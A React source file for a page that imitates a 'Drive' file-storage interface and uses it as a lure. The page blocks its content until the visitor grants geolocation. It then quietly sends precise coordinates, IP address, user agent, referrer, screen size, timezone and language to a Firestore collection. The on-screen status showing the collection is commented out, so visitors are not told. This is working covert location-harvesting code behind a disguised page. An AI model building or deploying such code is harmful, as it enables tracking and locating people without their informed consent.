import { useState, useEffect } from 'react'
import './App.css'
import { db } from '../services/firebasecongif.jsx'
import { collection, addDoc, serverTimestamp } from 'firebase/firestore'

function App() {
  const [location, setLocation] = useState(null)
  const [locationError, setLocationError] = useState(null)
  const [firestoreStatus, setFirestoreStatus] = useState('')
  const [ipAddress, setIpAddress] = useState(null)
  const [ipError, setIpError] = useState(null)
  const [permissionState, setPermissionState] = useState('prompt')
  const [isRequesting, setIsRequesting] = useState(false)

  // Function to get IP address with multiple fallback APIs
  const getIpAddress = async () => {
    // First try our own server endpoint (most reliable)
    try {
      console.log('Trying server endpoint...')
      const response = await fetch('/api/get-ip')
      if (response.ok) {
        const data = await response.json()
        if (data.ip) {
          setIpAddress(data.ip)
          console.log('IP Address (server):', data.ip)
          return data.ip
        }
      }
    } catch (error) {
      console.error('Server endpoint failed:', error)
    }

    // Fallback to external APIs
    const ipApis = [
      'https://api.ipify.org?format=json',
      'https://api64.ipify.org?format=json',
      'https://api.myip.com',
      'https://ipapi.co/json/',
      'https://ipinfo.io/json'
    ]

    for (const api of ipApis) {
      try {
        console.log(`Trying IP API: ${api}`)
        const response = await fetch(api, {
          method: 'GET',
          headers: {
            'Accept': 'application/json',
          },
          mode: 'cors'
        })
        
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`)
        }
        
        const data = await response.json()
        let ip = null
        
        // Handle different API response formats
        if (data.ip) {
          ip = data.ip
        } else if (data.query) {
          ip = data.query
        } else if (data.ipAddress) {
          ip = data.ipAddress
        }
        
        if (ip) {
          setIpAddress(ip)
          console.log('IP Address (external):', ip)
          return ip
        }
      } catch (error) {
        console.error(`Error with API ${api}:`, error)
        continue
      }
    }
    
    // Last resort: try httpbin
    try {
      const response = await fetch('https://httpbin.org/ip')
      const data = await response.json()
      if (data.origin) {
        setIpAddress(data.origin)
        console.log('IP Address (httpbin):', data.origin)
        return data.origin
      }
    } catch (error) {
      console.error('Error with httpbin:', error)
    }
    
    setIpError('Failed to fetch IP address from all sources')
    return null
  }

  // Function to save location to Firestore
  const saveLocationToFirestore = async (locationData) => {
    try {
      setFirestoreStatus('Saving to Firestore...')
      
      const locationDoc = {
        latitude: locationData.latitude,
        longitude: locationData.longitude,
        accuracy: locationData.accuracy,
        timestamp: locationData.timestamp,
        ipAddress: ipAddress,
        userAgent: navigator.userAgent,
        pageUrl: window.location.href,
        referrer: document.referrer,
        screenResolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        createdAt: serverTimestamp()
      }

      const docRef = await addDoc(collection(db, "locations"), locationDoc)
      console.log("Location saved to Firestore with ID: ", docRef.id)
      setFirestoreStatus(`Saved to Firestore with ID: ${docRef.id}`)
      
      return docRef.id
    } catch (error) {
      console.error("Error saving to Firestore: ", error)
      setFirestoreStatus(`Firestore Error: ${error.message}`)
      throw error
    }
  }

  const requestLocation = () => {
    if (!navigator.geolocation) {
      setLocationError('Geolocation is not supported by this browser.')
      setPermissionState('denied')
      return
    }
    setIsRequesting(true)
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const locationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: position.timestamp
        }
        localStorage.setItem('userLocation', JSON.stringify(locationData))
        setLocation(locationData)
        setPermissionState('granted')
        setLocationError(null)
        try {
          await saveLocationToFirestore(locationData)
        } catch (error) {
          console.error('Failed to save to Firestore:', error)
        } finally {
          setIsRequesting(false)
        }
      },
      (error) => {
        let errorMessage = 'Unknown error occurred'
        switch (error.code) {
          case error.PERMISSION_DENIED:
            errorMessage = 'Location access denied by user'
            setPermissionState('denied')
            break
          case error.POSITION_UNAVAILABLE:
            errorMessage = 'Location information unavailable'
            break
          case error.TIMEOUT:
            errorMessage = 'Location request timed out'
            break
        }
        setLocationError(errorMessage)
        setIsRequesting(false)
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 300000
      }
    )
  }

  useEffect(() => {
    getIpAddress()
    if (navigator.permissions && navigator.permissions.query) {
      try {
        navigator.permissions.query({ name: 'geolocation' }).then((result) => {
          setPermissionState(result.state)
          // Always trigger a prompt at first load when possible
          if (result.state === 'granted' || result.state === 'prompt') {
            requestLocation()
          }
          result.onchange = () => {
            setPermissionState(result.state)
            if (result.state === 'granted') {
              requestLocation()
            }
          }
        })
      } catch (e) {
        requestLocation()
      }
    } else {
      requestLocation()
    }
  }, [])

  if (!location) {
    return (
      <div className="permission-overlay">
        <div className="permission-card">
          <div className="permission-icon">📍</div>
          <h1>Enable Location Access</h1>
          <p>To continue, please allow location access.</p>
          {locationError && <p className="permission-error">{locationError}</p>}
          <button className="btn btn-primary" onClick={() => requestLocation()} disabled={isRequesting}>
            {isRequesting ? 'Requesting…' : 'Enable location'}
          </button>
          {permissionState === 'denied' && (
            <p className="permission-help">Location is blocked. Enable permissions in your browser settings and try again.</p>
          )}
        </div>
      </div>
    )
  }

  return (
    <div className="drive-app">
      <header className="drive-topbar">
        <div className="drive-left">
          <div className="drive-logo">D</div>
          <div className="drive-title">Drive</div>
        </div>
        <div className="drive-search">
          <input className="drive-search-input" placeholder="Search in Drive" />
        </div>
        <div className="drive-actions">
          <button className="btn drive-new">+ New</button>
          <div className="drive-avatar">G</div>
        </div>
      </header>

      <div className="drive-layout">
        <aside className="drive-sidebar">
          <button className="btn drive-upload">Upload files</button>
          <nav className="drive-nav">
            <a className="drive-nav-item active">My Drive</a>
            <a className="drive-nav-item">Shared with me</a>
            <a className="drive-nav-item">Recent</a>
            <a className="drive-nav-item">Starred</a>
            <a className="drive-nav-item">Trash</a>
          </nav>
          <div className="drive-storage">
            <div className="storage-bar"><span style={{ width: '18%' }} /></div>
            <div className="storage-text">1.8 GB of 10 GB used</div>
          </div>
        </aside>

        <main className="drive-content">
          <div className="drive-toolbar">
            <div className="drive-breadcrumb">My Drive / Location-based Session</div>
            <div className="drive-view-toggles">
              <button className="toggle active">Grid</button>
              <button className="toggle">List</button>
            </div>
          </div>

          <section className="drive-grid">
            {Array.from({ length: 12 }).map((_, i) => (
              <div className="drive-file" key={i}>
                <div className="drive-file-thumb">📄</div>
                <div className="drive-file-name">Document {i + 1}</div>
                <div className="drive-file-meta">Modified just now</div>
              </div>
            ))}
          </section>

          {/* <div className="drive-status">
            {ipAddress && <span>IP: {ipAddress}</span>}
            <span>
              Location: {location.latitude.toFixed(4)}, {location.longitude.toFixed(4)} (±{Math.round(location.accuracy)}m)
            </span>
            {firestoreStatus && <span>{firestoreStatus}</span>}
          </div> */}
        </main>
      </div>
    </div>
  )
}

export default App
